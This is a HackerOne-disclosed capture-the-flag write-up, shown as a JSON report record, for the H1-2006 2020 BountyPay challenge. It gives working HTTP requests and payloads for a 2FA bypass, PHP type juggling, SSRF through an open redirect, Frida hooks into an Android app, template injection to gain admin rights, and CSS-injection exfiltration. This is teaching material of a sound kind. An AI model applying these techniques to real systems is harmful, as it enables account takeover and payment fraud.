{"id":894170,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQxNzA=","url":"https://hackerone.com/reports/894170","title":"[H1-2006 2020] Writeup","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-06-09T00:39:14.659Z","submitted_at":"2020-06-09T00:39:14.659Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"njbooher","url":"/njbooher","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8gBaXxZaVswNz1ZdTYSp5vLP/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T00:09:28.262Z","bug_reporter_agreed_on_going_public_at":"2020-06-17T23:47:12.372Z","team_member_agreed_on_going_public_at":"2020-06-18T00:09:28.165Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"```\n^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n```\n\n# Prologue\n\nThe CTF was announced in a [Hacker0x01 tweet](https://twitter.com/Hacker0x01/status/1266454022124376064). The goal is to make payments from Marten Mickos' account on BountyPayHQ. The announcement tweet was followed shortly by a [retweet of BountypayHQ](https://twitter.com/BountypayHQ/status/1258692145252270080), an account made for the event. [BountypayHQ](https://twitter.com/BountypayHQ) has one tweet about a new staff member Sandra, and has a follower with the same name. Sandra's account has a [tweet with a photo](https://twitter.com/SandraA76708114/status/1258693001964068864) of a staff badge with 'STF:8FJ3KFISL3' visible on it. We make note of this for later.\n\nOn the [policy page for the CTF](https://hackerone.com/h1-ctf) we find the link to [main site for the event](https://bountypay.h1ctf.com/). That site links to separate subdomains for customers ([app](https://app.bountypay.h1ctf.com/)) and staff ([staff](https://staff.bountypay.h1ctf.com/)). However, the policy page lists the scope as '\\*.bountypay.h1ctf.com', so there are probably more. Using [ffuf](https://github.com/ffuf/ffuf) to fuzz the Host header, we find\n[api](https://api.bountypay.h1ctf.com/) and [software](https://software.bountypay.h1ctf.com/). The software site says I can't access it from my IP address, and the api site [showcases an open redirect](https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API) on its homepage. This suggests we'll find an [SSRF vulnerability](https://portswigger.net/web-security/ssrf) at some point.\n\n# app.bountypay.h1ctf.com\n\n## Getting in\n\nInitially I guessed the user might be 'sandra' and tried common passwords with Burp. Then I went through all the punctuation marks to see if any gave an error indicative of some sort of injection. Eventually I used ffuf to check for common files and directories. This turned up [a .git/config file](https://app.bountypay.h1ctf.com/.git/config). Visiting the repository for that, we find [a script](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) is logging the contents of incoming requests to [bp_web_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log) on the server as base64-encoded JSON. After using [CyberChef](https://gchq.github.io/CyberChef/) to decode it, we get:\n\n```\n1588931909 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931919 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931928 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931945 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nPlugging that username and password into the login form, we are asked for a 2FA code. I enter the value from the log file and submit the request. It doesn't work. Looking at the request in Burp we see that a hash is submitted in the 'challenge' field along with the values we provided.\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge_answer=bD83Jk27dQ\u0026challenge=5ca3e50bd0b0c9b94915573b64b664be\n```\n\nIt looks like MD5. After using CyberChef to hash the username, password, and challenge\\_answer in succession, we use Burp repeater to replace the challenge value in the form and retry the requests. The hash of challenge\\_answer works. And returns a new cookie:\n\n```http\nHTTP/1.1 302 Found\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Sun, 05-Jul-2020 14:44:36 GMT; Max-Age=2592000\nLocation: /\n```\n\nI notice the cookie starts with `eyJ` which indicates base64-encoded JSON. I then use Burp repeater's 'Request in Browser' action to replay the action in the browser and log in.\n\n## A quick look around\n\nThe dashboard we land on after we log in has a table for listing payments. There is a form for selecting the month and year to show transactions for. No data is displayed for the current month.  Trying a few other months also returns nothing.\n\nGlancing over at the Burp proxy history, we see the form submissions to go [/statements?month=01\u0026year=2020](https://app.bountypay.h1ctf.com/statements?month=01\u0026year=2020). The JSON output this returns indicates it's a wrapper around a method on the API site:\n\n```json\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nUsing Burp Intruder to add punctuation marks to month and year has no effect. Attempting to visit the API url directly gives an error about a missing token.\n\nWe also see that a file called [app.js](https://app.bountypay.h1ctf.com/js/app.js) was loaded. It contains the code that calls `/statements/`, as well as code to render the results. We see that results rows link to `/pay/{id}/{hash}`. Trying [a random number and MD5 hash](https://app.bountypay.h1ctf.com/pay/5/5ca3e50bd0b0c9b94915573b64b664be), we get an error 'Invalid payment details'. While we can't jump to making payments at this time, we know that wherever the CTF leads, we'll probably end up back here.\n\n## Analysis of the `token` cookie\n\nUsing CyberChef to decode the log in cookie we get:\n\n```json\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nThere's the account ID from the API site URL. We've probably found the SSRF.\n\nHowever, the first thing I like to do with JSON parameters is to change the data type of the parameters and see what happens. I use the [Hackvertor Burp plugin](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) and replace the token cookie value with:\n\n```\n\u003c@base64_2\u003e{\"account_id\":[\"F8gHiqSdpK\"],\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\u003c@/base64_2\u003e\n```\n\nThe account\\_id parameter, which is expected to be a string, is now an array. In response we get:\n\n```json\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/Array\\/statements?month=01\u0026year=2020\",\"data\":\"[\\\"Invalid Account ID\\\"]\"}\n```\n\nThis tells us two things:\n1. This site is probably built with PHP. (The string value of an array in PHP is 'Array')\n1. The value of account\\_id doesn't seem to matter to the app site. It just blindly forwards it to the API site.\n\nPHP is famous for its [type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf). In particular, how `\"any string\" == 0`. Let's try it.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"F8gHiqSdpK\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nWe get the same successful response from earlier.\n\nIn summary, account\\_id matters to the API site, and hash matters to the app site. If account\\_id were easily enumerable, we could stop here. But brute forcing it is worst case 62^10 = 8.3929937e+17 , so that's probably not going to happen. Back to the SSRF we go.\n\n## Exploit the SSRF\n\nIncorporating the information from the prologue, the goal is probably to use the open redirect on the API site to get something off the software site.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"../../redirect?url=https://www.google.com/search?q=REST+API#\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nTrying a URL other than Google, we find get an error \"URL NOT FOUND IN WHITELIST\". I wasted some time thinking this would need to be chained with an [I'm Feeling Lucky open redirect](https://nakedsecurity.sophos.com/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/). After a bit Google threw up a CAPTCHA. Then I realized I hadn't actually tried to just redirect to software directly.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nWell, that worked, and now we see a login page. Adding [CRLF to try and add headers](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) or insert additional requests didn't seem to work, so this is probably a GET-only SSRF and logging into the site won't be possible.\n\nAfter some content discovery with Intruder, we find a directory listing at /uploads/ containing one file: an Android app.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/uploads/BountyPay.apk#\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nAttempting to download it through the SSRF gives an empty response. But downloading it directly works.\n\nhttps://software.bountypay.h1ctf.com/uploads/BountyPay.apk\n\n# BountyPay.apk\n\nI haven't done much with Android apps before, but I have done some basic static analysis. This [HackerOne blog post](https://www.hackerone.com/blog/androidhackingmonth-intro-to-android-hacking) is very helpful.\n\n## Static analysis\n\nI start by downloading [jadx](https://github.com/skylot/jadx) and use it to decompile the app.\n\nIt's divided into 3 main files:\n* F859859\n* F859858\n* F859857\n\nI don't see anything that looks like a token, and decide I will need to actually run the app.\n\n## Running the app\n\nI have an iPhone, so I download [Android Studio](https://developer.android.com/studio) for this.\n\nIn Android studio, I create a new empty application, and then open the 'Android Virtual Device Manager' and create a Pixel XL device with Android R. Afterwards, right click the device and do 'Cold Boot Now'. Then drag and drop the apk onto the virtual device to install it.\n\nThe first screen asks for a username, and when you click next you are dropped on an empty screen. There is a button in the corner that, when clicked, provides very helpful hints: 'Deep links' and 'Params'. I don't know what this means, and decide that dynamic analysis will be needed.\n\n## Dynamic analysis\nI installed [Frida](https://frida.re/docs/installation/) in my [WSL Ubuntu](https://docs.microsoft.com/en-us/windows/wsl/install-win10), which I frequently use for python stuff. Then, using the Terminal built into Android Studio, I rooted the emulator and installed the Frida server on the it following the directions [here](https://frida.re/docs/android/) .\n\n```\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe root\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe push C:\\Users\\Nick\\workspace\\hackeronectf\\frida-server-12.9.4-android-x86 /data/local/tmp/\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe shell \"chmod 755 /data/local/tmp/frida-server-12.9.4-android-x86\"\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe shell \"/data/local/tmp/frida-server-12.9.4-android-x86 \u0026\"\n```\n\nGreat. Now that I have the tools installed, how does Android hacking work?\n\nThe [Frida Android example page](https://frida.re/docs/examples/android/) shows how to hook the onClick handler of a button. Looking back at the source for the three source files for BountyPay, they seem to all have a similar structure.\n\n```java\npublic void onCreate(Bundle savedInstanceState) {\n  // ... stuff\n  if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n\n    // show boxes based on values of query parameters that are part of this 'intent' thing.\n    getIntent().getData().getQueryParameter(\"start\")\n\n  }\n}\n```\n\nSo it looks like all we have to do is hook onCreate and set the query parameters before calling the original onCreate.\n\n## Activities\n\n### PartOneActivity\n\nSource: F859859\n\nI throw this together in a script file:\n\n```javascript\nJava.perform(function () {\n\n  send('perform');\n  // Function to hook is defined here\n\n  var PartOneActivity = Java.use('bounty.pay.PartOneActivity');\n  var javaUri = Java.use('android.net.Uri');\n\n  // Whenever button is clicked\n  var onCreate = PartOneActivity.onCreate;\n  onCreate.implementation = function (savedInstanceState) {\n    // Show a message to know that the function got called\n    send('onCreate');\n\n    if (this.getIntent() != null) {\n        send('gotintent');\n        var intentData = javaUri.parse(\"content://asdf/?start=PartTwoActivity\");\n        this.getIntent().setData(intentData);\n    }\n\n    // Call the original onCreate handler\n    onCreate.call(this, savedInstanceState);\n  };\n});\n```\n\nand in my WSL Ubuntu terminal run it\n\n```bash\nfrida -U -l runme.js bounty.pay\n```\n\nAccording to the terminal output, only the 'perform' part happened. After some Googling, I find a [GitHub issue comment](https://github.com/frida/frida/issues/480#issuecomment-441453427) that explains that in order to hook onCreate we need our stuff to run before the app starts.\n\nI borrow the code from that comment and put my javascript in it.\n\nF859851\n\nI then kill the app on the emulator and run the python script with:\n\n```\npython3 ctf_part1.py\n```\n\nIt works, and we're on to part two.\n\n### PartTwoActivity\n\nSource: F859858\n\nReading the code, it's very similar to part one, and I update the Frida script accordingly.\n\nF859852\n\nAfter killing the app and running the script, there's a hash displayed on the screen (459a6f79ad9b13cbcb5f692d2cc7a94d), and a box prompting for a 'Header' value. From reading the code, we can see this must start with 'X-' to move on, so the hash that's displayed probably isn't what it's asking for. Peeking ahead at F859857 , we see a few base64-encoded strings. Decoding them, we find that `WC1Ub2tlbg==` is `X-Token`. I type 'X-Token' into the field and we're on to part 3.\n\n### PartThreeActivity\n\nSource: F859857\n\nReading the code, it's very similar to part one, except some of the query parameters are expected to be base64 encoded. I update the Frida script accordingly.\n\nF859854\n\nAfter killing the app and running the script, there's a box prompting for a leaked hash value. I try the hash from part two and it doesn't work.\n\nI notice in the source there are some calls to print a token to the logs, which would appear in the Logcat window in Android Studio. But those messages don't seem to have happened.\n\nWhile wondering what to do next, I notice that after a delay, these messages start appearing in the logs:\n\n```\nbounty.pay I/TAG: Starting authentication\nbounty.pay D/TAG: signInAnonymously:success\nbounty.pay I/TAG: Getting host endpoint\nbounty.pay I/TAG: Getting Token\n```\n\nMaybe now that it's had time to fetch them, they'll be printed if we retry it?\n\nI click the back button in the emulator, and resubmit the form for PartTwoActivity. Now in the logs we see:\n\n```\nbounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com\nbounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1\n```\n\nEntering that token into the PartThreeActivity, a congratulations screen appears. We've now got a token for the API server!\n\n# api.bountypay.h1ctf.com\n\nNow that I have an API token, I use Intruder to try other HTTP methods on the one endpoint we know about:\n\n```http\nPOST /api/accounts/F8gHiqSdpK/statements?month=04\u0026year=2020 HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\nNothing happens. I then try adding punctuation to each part of the path, query parameters, and token header value. Nothing interesting happens.\n\nNext I use ffuf to look for other methods and find the `/api/staff` method. It responds with:\n\n```json\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\n\nI then use Intruder to try other HTTP methods on this endpoint. POST returns the following message:\n\n```json\n[\"Missing Parameter\"]\n```\n\nI add name as a body parameter. Same message.\n\nThen I try staff_id with a value from the GET response.\n\n```http\nPOST /api/staff/ HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\nstaff_id=STF:84DJKEIP38\n```\n\nThe following message is returned:\n\n```json\n[\"Staff Member already has an account\"]\n```\n\nAh, so this is making a new staff member account. Sandra from Twitter doesn't seem to be in the list. Let's try her ID (STF:8FJ3KFISL3)\n\nResponse:\n\n```json\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n# staff.bountypay.h1ctf.com\n\n## Getting in\nVisiting the site, we are redirected to [/?template=login](https://staff.bountypay.h1ctf.com/?template=ticket).\nIn the last section we saw that Brian Oliver is supposedly a staff member. I try logging in with the credentials we used for him on the app site and they don't work. I then use the credentials the API server gave us for Sandra and they work. The cookie looks like:\n\n```\ntoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n```\n\n## A quick look around\n\nThe main page is [/?template=home](https://staff.bountypay.h1ctf.com/?template=home)\n\nThe functionality of the site is minimal. The dashboard has two tabs:\n\n1. A list of support tickets, with only one ticket. Viewing a ticket has its on template: [/?template=ticket\u0026ticket_id=3582](https://staff.bountypay.h1ctf.com/?template=ticket\u0026ticket_id=3582)\n1. A form to change your profile name and avatar. This posts to [/?template=home](https://staff.bountypay.h1ctf.com/?template=home).\n\nIn Burp proxy history, we see that a file [website.js](https://staff.bountypay.h1ctf.com/js/website.js) was loaded. It contains functions calling two additional pages:\n\n1. [/admin/upgrade?username=sandra.allison](https://staff.bountypay.h1ctf.com/admin/upgrade?username=sandra.allison) to upgrade a user to admin. It can be called with a GET request, but trying it gives an error: \"Only admins can perform this\"\n1. [/admin/report?url=Lz90ZW1wbGF0ZT1ob21l](https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZT1ob21l) to report a page for the admin to review. The URL parameter is base64 encoded. In response it returns \"Report received\". Reporting the /admin/upgrade URL returns the same response and nothing happens.\n\n## Dead ends\n\nI begin by testing all of the parameters observed for signs of injection vulnerabilities using my trusty wordlist of punctuation marks. Nothing stands out.\n\nI test all the parameters for what happens if you turn them into an array. Nothing stands out.\n\nI call /admin/report with the url parameter pointing at a Burp collaborator URL as well as my SSRF testing toy app. No requests are received.\n\nI test the template parameter for path traversal and local file inclusion. Doesn't seem to work.\n\n## Another dead end\n\nWhile token cookie format doesn't look like base64-encoded JSON, I try decoding it as base64 anyway.\n\n```\nsIluEVmypbzy/Un0njpgLfyONobB8ao8pxKJhQBdhRTpg1SCXylVDJrRjrr0JeMlTdnr/Ss32wXInW6cEKYyOQCu5MdRO1/SMkCXAd80mDdemzDFVyYYTuVzx04Vy1ilQmOBQP6tUh97pAYcoCim+vwDdaQu7PGRaRn6d4zG\n```\n\nOdd, that still looks like base64. Decoding it again returns a blob of unprintable stuff.\n\nWhile testing the profile name change functionality I noticed the cookie value got longer when I used longer profile names. This suggests the cookie is actually storing the state for this and there's no backing database. While this site is supposed to act like a real site, it makes sense that it would be implemented this way. It seems unlikely that breaking the cookie is the intended solution here. I still put a few hours into it and was unsuccessful.\n\n## Half an XSS\n\nTaking a closer look at [website.js](https://staff.bountypay.h1ctf.com/js/website.js), we see the makings of what could be an XSS.\n\nIf the URL hash matches 'tab[1-4]' the code will trigger the onClick event on elements with that class on page load. The onClick event for  'upgradeToAdmin' will trigger the request to upgrade the username specified in the 'username' input field. The inclusion of tab4 in the hash code seems odd since the dashboard markup only has tab1, tab2, and tab3. Maybe the username field is on tab4 for admins.\n\nLooking around for an opportunity to inject a class name in the markup, we see that the user avatar setting is used as a CSS class name. Intercepting the POST request to change the profile name, we modify it to change the avatar value:\n\n```http\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\nprofile_name=sandra\u0026profile_avatar=upgradeToAdmin%20tab1%20tab2%20tab3%20tab4\n```\n\nThis updates our cookie. Next we visit [/?template=home#tab1](https://staff.bountypay.h1ctf.com/?template=home#tab1) and can see in the Burp Proxy history that a request to /admin/upgrade was made on page load.\n\nTime to test this out for real. I make a request to\n\n```http\nGET /admin/report?url=\u003c@base64_2\u003e/?template=home\u0026username=sandra.allison#tab4\u003c@/base64_2\u003e HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWnltMlpjNzBISitQZ1RhZVJsNDY3TlBGbnBQY3VaTkwvSEEwTURoc3lsZy8xMVpPTHg5UDVoR21ZeUk1TlM5VlJhSCs0VGZkNFl2Ullj\n```\n\nannnnnnd...\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 19\n\n[\"Report received\"]\n```\n\nThat was disappointing.\n\n## The missing piece\n\nI messed with this a bit on Monday and didn't get anywhere. I was stuck and out of ideas. I tried to forget about it because I figured the answer would probably come to me later.\n\nTuesday morning while retrying everything, I realize I overlooked something. While I had tried changing parameters to arrays already, I must have skipped this check for the template parameter in favor of looking for path traversal. Doing so now, I noticed that changing template parameter to an array still loaded the page successfully, even though changing it to garbage strings gave a blank page.\n\nThen I realized that passing multiple values in the array would render [multiple templates on the same page](https://staff.bountypay.h1ctf.com/?template[]=login\u0026template[]=ticket).\n\nAfter a bit I figure out the correct URL to report.\n\n```http\nGET /admin/report?url=\u003c@base64_2\u003e/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab3\u003c@/base64_2\u003e HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWnltMlpjNzBISitQZ1RhZVJsNDY3TlBGbnBQY3VaTkwvSEEwTURoc3lsZy8xMVpPTHg5UDVoR21ZeUk1TlM5VlJhSCs0VGZkNFl2Ullj\n```\n\nannnnnnd...\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWXZvVjl5K1gzQTlmZ1RhZVJsNDY3TlBGbnBQY3VaTkwrUkJrVlZoYy96aEtjZ043YWhwdmx2SEdwaWNKVUMrRlJkU2VCRUtkZ2I2aFlj; expires=Sun, 05-Jul-2020 18:58:11 GMT; Max-Age=2592000; path=/\nContent-Length: 19\n\n[\"Report received\"]\n```\n\nWe're in. Re-visiting the homepage, a full list of users and plain-text passwords is now on tab 4.\n\n```\nmarten.mickos\nh\u0026H5wy2Lggj*kKn4OD\u0026Ype\n```\n\n# Back at app.bountypay.h1ctf.com\n\n## Getting in\n\nBack on the customer site, we login with the new credentials and bypass the 2FA the same way as before, re-using the same challenge and challenge answer.\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 130\n\nusername=marten.mickos\u0026password=h%26H5wy2Lggj*kKn4OD%26Ype\u0026\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n\n## The new `token` cookie\n\nOur new token is\n\n```\ntoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n```\n\nDecoded we get.\n\n```\n\u003c@base64_4\u003e{\"account_id\":\"Ae8iJLkn9z\",\"hash\":\"3616d6b2c15e50c0248b2276b484ddb2\"}\u003c@/base64_4\u003e\n```\n\nAnd test that replacing the hash with 0 still works.\n\n```\n\u003c@base64_4\u003e{\"account_id\":\"Ae8iJLkn9z\",\"hash\":0}\u003c@/base64_4\u003e\n```\n\nStill works. I should have stuck with brute forcing the account id. Ae8iJLkn9z was going to be my next guess.\n\n## The End\n\nOn the dashboard, we select 05/2020 and click 'Load Transactions'.\n\nA table row appears indicating we owe Hacker 272 over $200,000!\n\nThis is it! We can pay the hackers now!\n\nWe click the green [Pay](https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba) button. And we find the flag!\n\n{F859856}\n\n# Epilogue\n\nActually, we hit another 2FA screen.\n\nI click the 'Send Challenge' button. Glancing over at the Burp history we see that the request includes a hidden parameter.\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\n\nOk, we'll need to use [CSS injection](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d).\n\nI turn one of my wordlists into a stylesheet using regex find and replace in VSCode.\n\nF859855\n\nI upload it into a private GitHub gist, and swap it in for the app_style param in the request. And it doesn't work. After a bit I figure out it's because Gist doesn't serve files with the expected Content-Type header. I use [GitHack](https://raw.githack.com/) to wrap it, and it works.\n\nBurp collaborator receives 7 pings for code_[1-7]. I generate another stylesheet to actually extract the values.\n\nF859853\n\nI create another private Gist to host it and get a GitHack URL for it.\n\nBurp collaborator receives 7 pings, one for each character of the code. I enter it. And the flag appears.\n\n```\n^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n```\n\n## Impact\n\nThis was fun. Thanks.","vulnerability_information_html":"\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"prologue\"\u003ePrologue\u003c/h1\u003e\n\n\u003cp\u003eThe CTF was announced in a \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1266454022124376064\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHacker0x01 tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The goal is to make payments from Marten Mickos\u0026#39; account on BountyPayHQ. The announcement tweet was followed shortly by a \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Fstatus%2F1258692145252270080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eretweet of BountypayHQ\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, an account made for the event. \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBountypayHQ\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has one tweet about a new staff member Sandra, and has a follower with the same name. Sandra\u0026#39;s account has a \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114%2Fstatus%2F1258693001964068864\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweet with a photo\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e of a staff badge with \u0026#39;STF:8FJ3KFISL3\u0026#39; visible on it. We make note of this for later.\u003c/p\u003e\n\n\u003cp\u003eOn the \u003ca href=\"https://hackerone.com/h1-ctf\"\u003epolicy page for the CTF\u003c/a\u003e we find the link to \u003ca href=\"/redirect?url=https%3A%2F%2Fbountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003emain site for the event\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. That site links to separate subdomains for customers (\u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2F\" target=\"_blank\" 